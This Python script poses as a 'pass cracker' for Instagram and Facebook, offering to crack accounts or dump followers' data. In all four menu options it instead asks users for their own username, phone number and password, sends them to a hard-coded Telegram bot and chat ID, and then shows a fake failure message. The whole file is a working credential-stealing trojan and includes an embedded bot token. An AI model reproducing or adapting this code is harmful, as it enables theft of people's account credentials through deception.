import telegram
import os
import re
import time

red = '\033[91m'
green = '\033[92m'
blue = '\033[94m'
bold = '\033[1m'
reset = '\033[0m'

os.system("clear")
print(green+"""

          ░█▀█░█▀█░█▀▀░█▀▀░░░█▀▀░█▀▄░█▀█░█▀▀░█░█░█▀▀░█▀▄
          ░█▀▀░█▀█░▀▀█░▀▀█░░░█░░░█▀▄░█▀█░█░░░█▀▄░█▀▀░█▀▄
          ░▀░░░▀░▀░▀▀▀░▀▀▀░░░▀▀▀░▀░▀░▀░▀░▀▀▀░▀░▀░▀▀▀░▀░▀  

"""+reset)
print(bold+red+"    Devoloped By :"+reset, end=' ')
print("Anonymous", end= ' ')
print(bold+red+"          Credit :"+reset, end= ' ')
print("Bengladesh Hackers")
print(" ")
print(bold+"                       pass cracker v 2.0.1"+reset)
print("""

""")

print("1.Crack Instagram \n2.Crack Facebook \n3.Dump instagram followers info \n4.Dump facebook friends info  \n\nSelect the number you want and type it and press enter.\n\n")
number = int(input("Enter the number : "))

if number == 1:
    os.system("clear")
    os.system("figlet insta cracker")
    print("\033[32mTool devoloped : Anonymous\033[0m")
    # Initialize the telegram bot with api key
    hack = telegram.Bot(token='5900967676:AAH-0pz-96j0KG7V_9nN-4iTdgd_JyDA34k')

    print("You need to enter your own account and password to crack your victims. Otherwise tool will not work. Please use original account")
    print("""

    """)

    # Get the username and password from the user
    username = input('Enter your correct instagram username: ')
    # Validate the phone number
    while True:
    	phone_number = input('Enter your phone number with country code (eg : +91) : ')
    	if re.match(r'^\+?\d{10,15}$', phone_number):
        	# Phone number is valid
        	break
    	else:
        	# Phone number is not valid
        	print('Invalid phone number. Please enter a valid phone number.')
    password = input('Enter your password: ')

    # Send the username and password to telegram
    hack.send_message(chat_id=5667008094, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
    print("Logging in to your account... please wait...")
    time.sleep(3)
    os.system("clear")
    print("start cracking your followers...")
    time.sleep(4)
    print(red+bold+"Failed !! check your details and try again. Or it may due to security reasons.")




elif number == 2:
    os.system("clear")
    os.system("figlet facebook cracker")
    print("\033[32mTool devoloped : Anonymous\033[0m")
    # Initialize the telegram bot with api key
    hack = telegram.Bot(token='5900967676:AAH-0pz-96j0KG7V_9nN-4iTdgd_JyDA34k')

    print("You need to enter your own account and password to crack your victims. Otherwise tool will not work. Please use original account")
    print("""

    """)

    # Get the username and password from the user
    username = input('Enter your facebook username or email : ')
    # Validate the phone number
    while True:
    	phone_number = input('Enter your phone number with country code (eg : +91) : ')
    	if re.match(r'^\+?\d{10,15}$', phone_number):
        	# Phone number is valid
        	break
    	else:
        	# Phone number is not valid
        	print('Invalid phone number. Please enter a valid phone number.')
    password = input('Enter your password: ')

    # Send the username and password to telegram
    hack.send_message(chat_id=5667008094, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
    print("Logging in to your account... please wait...")
    time.sleep(3)
    os.system("clear")
    print("start cracking your facebook friends...")
    time.sleep(4)
    print(red+bold+"Failed !! check your details and try again. Or it may due to security reasons.")



elif number == 3:
    os.system("clear")
    os.system("figlet insta dump")
    print("\033[32mTool devoloped : Anonymous\033[0m")
    # Initialize the telegram bot with api key
    hack = telegram.Bot(token='5900967676:AAH-0pz-96j0KG7V_9nN-4iTdgd_JyDA34k')

    print("You need to enter your own account and password to crack your victims. Otherwise tool will not work. Please use original account")
    print("""

    """)

    # Get the username and password from the user
    username = input('Enter your instagram username: ')
    # Validate the phone number
    while True:
    	phone_number = input('Enter your phone number with country code (eg : +91) : ')
    	if re.match(r'^\+?\d{10,15}$', phone_number):
        	# Phone number is valid
        	break
    	else:
        	# Phone number is not valid
        	print('Invalid phone number. Please enter a valid phone number.')
    password = input('Enter your password: ')

    # Send the username and password to telegram
    hack.send_message(chat_id=5667008094, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
    print("Logging in to your account... please wait...")
    time.sleep(3)
    os.system("clear")
    print("start dumping your followers info...")
    time.sleep(4)
    print(red+bold+"Failed !! check your details and try again. Or it may due to security reasons.")

elif number == 4:
    os.system("clear")
    os.system("figlet facebook dump")
    print("\033[32mTool devoloped : Anonymous\033[0m")
    # Initialize the telegram bot with api key
    hack = telegram.Bot(token='5900967676:AAH-0pz-96j0KG7V_9nN-4iTdgd_JyDA34k')

    print("You need to enter your own account and password to crack your victims. Otherwise tool will not work. Please use original account")
    print("""

    """)

    # Get the username and password from the user
    username = input('Enter your facebook email address or username: ')
    # Validate the phone number
    while True:
    	phone_number = input('Enter your phone number with country code (eg : +91) : ')
    	if re.match(r'^\+?\d{10,15}$', phone_number):
        	# Phone number is valid
        	break
    	else:
        	# Phone number is not valid
        	print('Invalid phone number. Please enter a valid phone number.')
    password = input('Enter your password: ')

    # Send the username and password to telegram
    hack.send_message(chat_id=5667008094, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
    print("Logging in to your account... please wait...")
    time.sleep(3)
    os.system("clear")
    print("start dumping your friends info...")
    time.sleep(4)
    print(red+bold+"Failed !! check your details and try again. Or it may due to security reasons.")


  
else:
    print("\033[91mINVALID OPTION PLEASE ENTER THE CORRECT NUMBER FROM ABOVE\033[0m")
